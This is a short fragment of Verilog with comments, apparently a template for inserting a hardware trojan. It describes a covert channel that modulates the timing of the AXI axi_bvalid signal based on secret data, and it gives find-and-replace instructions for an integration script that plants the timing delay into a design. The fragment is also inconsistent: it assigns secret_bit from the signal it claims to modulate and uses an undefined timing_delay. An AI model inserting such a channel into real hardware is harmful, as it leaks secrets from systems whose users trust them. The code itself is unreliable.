 ...
 * Payload: Modulate timing of axi_bvalid based on secret data
 * 
...
assign secret_bit = axi_bvalid[0];
...
// ============================================================
// Covert Channel: Modulate timing of axi_bvalid
//
// Integration Script Must Modify:
//
// IF axi_bvalid is timing-sensitive:
//   Find: assign axi_bvalid = ready_signal;
//   Replace: assign axi_bvalid = (timing_delay == 0) ? ready_signal : 1'b0;
//
